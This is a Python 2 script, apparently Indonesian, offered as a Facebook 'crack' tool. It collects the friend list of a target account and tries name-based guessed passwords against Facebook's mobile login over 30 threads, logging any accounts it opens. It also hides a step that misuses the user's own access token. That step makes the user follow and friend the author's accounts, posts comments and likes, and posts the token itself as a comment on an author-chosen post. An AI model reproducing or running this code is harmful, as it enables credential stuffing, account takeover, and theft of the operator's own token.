''' Raka Andrian Tara
   facebook : Raka Andrian Tara
   github : Bajingan-Z
'''

import os
import sys
import random
import time
try:
	import re
	import json
	import requests
except ImportError:
	print(' [-] module requests Not installed ')
	print(' [-] Type > pip2 install requests')
try:
	from requests.exceptions import ConnectionError
	from datetime import datetime
	from multiprocessing.pool import ThreadPool
except ConnectionError:
	jalan(' [-] Check your internet Connection ');time.sleep(1)
	
loop = 0
id = []
ra_pw = []

#color
ku = '\x1b[1;93m'
hj = '\x1b[1;92m'
ml = '\x1b[1;101m'
ra = '\x1b[0m'
m = '\x1b[1;91m'
bm = '\x1b[1;96m'
#ua_one = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
#ua_two = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaX6-00/40.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4"
#ua_three = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.3; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/525"
#ua_four = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.3; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/525"
#ua_five = "nokia 6280/2.0(03.60)/profile/midp-1.0;configuration/cldc-1.0"
ua_six = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125"
ua_xx = "BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103"
ua_rr = "BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104"
#user agent
raka_ua = random.choice([ua_xx])
#pw admin
#pw_raka = 'rakaanonym'
#ip
try:
	ip = requests.get('https://api.ipify.org').text
except ConnectionError:
	jalan('\n [!] Check Your Internet Connection !\n ');time.sleep(1)

	
garis = '''\x1b[1;92m_______________________________________________________\x1b[1;97m
'''
	
def jalan(z):
	for i in z + '\n':
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(00.01)

raka_logo = '''
\x1b[1;91m$$$$$$$$\ $$\ 
\x1b[1;91m$$  _____|$$ |
\x1b[1;92m$$ |      $$ | $$$$$$\   $$$$$$\
\x1b[1;92m$$$$$\    $$ |$$  __$$\  \____$$\
\x1b[1;96m$$  __|   $$ |$$ /  $$ | $$$$$$$ |
\x1b[1;96m$$ |      $$ |$$ |  $$ |$$  __$$ |
\x1b[1;93m$$$$$$$$\ $$ |\$$$$$$$ |\$$$$$$$ |
\x1b[1;93m\________|\__| \____$$ | \_______|
\x1b[1;95m             $$\   $$ |
\x1b[1;95m            \$$$$$$  |
\x1b[1;95m             \______/  
\x1b[1;92m_______________________________________________________\n
\x1b[1;97m Desigen By  : \x1b[1;92mRaka Andrian Tara
\x1b[1;97m Github      : \x1b[1;92mBajingan-Z
\x1b[1;97m Coded By    : \x1b[1;92mRaka \x1b[1;97m& \x1b[1;32mAngga
\x1b[1;92m_______________________________________________________\x1b[1;97m
'''
raka_sayang_amanda = '3882176535153442'
def login():
	os.system("clear")
	try:
		token = open('login_r.txt','r')
		menu()
	except (KeyError,IOError):
		jalan(raka_logo);time.sleep(00.01)
		jalan(' [%s1%s] Login With Token Facebook '%(bm,ra));time.sleep(00.01)
                jalan(' [%s2%s] Cara Mengambil Token '%(bm,ra));time.sleep(00.01)
		jalan(' [%s0%s] Exit \n'%(m,ra));time.sleep(00.01)
		met_log = raw_input(" [\x1b[1;96m-\x1b[1;97m] Choose : \x1b[1;92m")
		if met_log =="":
			print '\n [!] Please Fill '; time.sleep(1)
			login()
		elif met_log == "1" or met_log == "01":
			tokenz()
                elif met_log == "2" or met_log == "02":
                        jalan('\n\x1b[1;97m [\x1b[1;96m-\x1b[1;97m] Anda akan diarahkan ke \x1b[1;92mYoutube\x1b[1;97m... \n [\x1b[1;96m-\x1b[1;97m] Simak Baik Baik Step \x1b[1;92mby\x1b[1;97m Step Nya... '); time.sleep(00.05)
		        os.system("xdg-open https://youtu.be/bszAm4C5ovE")
                        exit()
		elif met_log == "0":
			jalan(' [R] Please Come Back Again ');time.sleep(1)
			os.system('exit')
		else:
			login()

def tokenz():
	os.system('clear')
	print(raka_logo)
	try:
		token = open('login_r.txt','r')
	except (KeyError,IOError):
		token = raw_input(' [\x1b[1;96m-\x1b[1;97m] Token : \x1b[1;92m')
                jalan(' \x1b[1;97m[\x1b[1;96m-\x1b[1;97m] Pleace Wait \x1b[1;92m...\x1b[1;97m ');time.sleep(1)
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login_r.txt", 'w')
			avsid.write(token)
			avsid.close()
			follow_my_raka()
			jalan('[!] Login Succes....');time.sleep(1)
		except KeyError:
			print ' [!] Token Wrong '

def follow_my_raka():
    try:
        token = open('login_r.txt', 'r').read()
    except IOError:
        print(' Invalid Token ! ')
        jalan(' Please Login Again');time.sleep(1)
        os.system('rm -rf login_r.txt')
    kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
    kata_utama = ("Pengguna Script Premium")
    komen = kata_utama+"\n"+kata_kata_cinta
    kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
    kata_utama2 = random.choice(["Hai Aa @[100000834003593:]","Hello Aa @[100000834003593:]","Hello Aa @[100000834003593:]","Hai Aa @[100000834003593:]"])
    komen2 = kata_utama2+"\n"+kata_mutiara_islam
    pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
    kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN")
    komen3 = kata_utama3+"\n"+pantun_motivasi
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
    requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
    requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token)
    requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+token)
    requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
    requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
    requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
    requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
    menu()
    
def menu():
	os.system('clear')
	global token
	try:
		token = open('login_r.txt','r').read()
	except IOError:
		jalan(' [!] Token Invalid ');time.sleep(1)
		os.system('clear')
		os.system('rm -rf login_r.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		jalan(' [!] Invalid Token ');time.sleep(1)
		os.system('rm -rf login_r.txt')
		login()
	except requests.exceptions.ConnectionError:
		print(' [!] Check Your Internet Vonnection ')
	print(raka_logo)
	print ' [%s-%s] Nama    : %s'%(hj,ra,nama)
	print ' [%s-%s] Ip User : %s'%(hj,ra,ip)
	print ' [%s-%s] Id User : %s\n'%(hj,ra,id)
	print ' [%s1%s] Start Crack '%(hj,ra)
	print ' [%s2%s] Delete Token '%(hj,ra)
	print ' [%s0%s] Logout\n '%(m,ra)
	asw = raw_input(' [\x1b[1;96m-\x1b[1;97m] Choose : \x1b[1;92m')
	if asw =='1' or asw =='01':
		crack()
	elif asw =='2' or asw =='02':
		jalan(' \x1b[1;97m[!] Delete Token....');time.sleep(1)
		os.system('rm -rf login_r.txt')
		login()
	elif asw =='0':
		jalan(' [!] Please Come Back ');time.sleep(1)
		os.system('exit')
	elif asw =='' or asw ==' ':
		jalan(' [!] Please Fill In')
		menu()
	else:
		jalan(' [!] Just Select Whats On The Menu ');time.sleep(1)
		menu()
		
def crack():
	os.system('clear')
	print(raka_logo)
	global token
	try:
		token = open('login_r.txt', 'r').read()
	except IOError:
		print' [!] Invalid Token '
		tokenz()
	ra_id = raw_input("[\x1b[1;96m-\x1b[1;97m] ID Public : \x1b[1;92m")
	try:
		pok = requests.get("https://graph.facebook.com/"+ra_id+"?access_token="+token)
		sp = json.loads(pok.text)
	except KeyError:
		jalan(' [!] Id Not Found ');time.sleep(1)
	r = requests.get("https://graph.facebook.com/"+ra_id+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		rax_x = i['id']
		name = i['name']
		id.append(rax_x+'<=>'+name)
	print("\x1b[1;97m[\x1b[1;96m-\x1b[1;97m] Total ID  : \x1b[1;92m"+str(len(id)))
	print(garis)
	print("\x1b[1;97mKlick \x1b[1;92mCTRL+Z \x1b[1;97mUntuk Berhenti ...")
        print("\x1b[1;92mNOTE\x1b[1;97m : Jika Tak Ada Hasil Mainkan Mode Pesawat \x1b[1;92m1 \x1b[1;97mDetik...?")
	print(garis)

	def main(user):
		global loop, token
		ra_pw = []
		sys.stdout.write(
		      '\r[\x1b[1;92mR\x1b[1;97m] Crack %s - %s \x1b[1;92mMohon Ditunggu... \x1b[1;97m! ' % (loop, len(id))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		rax_x,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5 or len(ss) == 6 or len(ss) == 7:
					ra_pw.append(name)
					ra_pw.append(ss+"12")
					ra_pw.append(ss+"123")
					ra_pw.append(ss+"1234")
					ra_pw.append(ss+"12345")
                                        ra_pw.append(ss+"bismillah")
                                        ra_pw.append(ss+"sayang")
				else:
					ra_pw.append("000786")
					ra_pw.append("786786")
					ra_pw.append("889900")
					ra_pw.append("@@@###")
		try:
			for pw in ra_pw:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': raka_ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \x1b[1;92m[RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'       ')
					ok.append(rax_x+'|'+pw)
					save.write('[RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login_r.txt').read()
						url = ("https://graph.facebook.com/"+rax_x+"?access_token="+token)
						data = s.get(url).json()
						tgllhr = data['birthday'].replace("/","-")
						nama = data['name']
						print('  \r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ '|' + pw + ' <-> ' + tgllhr)
						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
						save.write('[RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
						save.close()
						break
					except(KeyError, IOError):
						tgllhr = " "
					except:pass
					print('  \r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + '       ')
					cp.append(rax_x+'|'+pw)
					save.write('[RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
        jalan(' \n[\x1b[1;92m-\x1b[1;97m] Copy paste Hasil Crack Dan Simpan Selama \x1b[1;92m2 \x1b[1;97mHari ...? ');time.sleep(1)
	exit(' \n[\x1b[1;92m!\x1b[1;97m] Finished ... ')

if __name__ == '__main__':
	#os.system('clear')
	#print(raka_logo)
	#user = raw_input(' [\x1b[1;97m?\x1b[0m] Siapa Nama Anda : ')
	#print# ' Hello : %s'#%(user)
	#lock()
	login()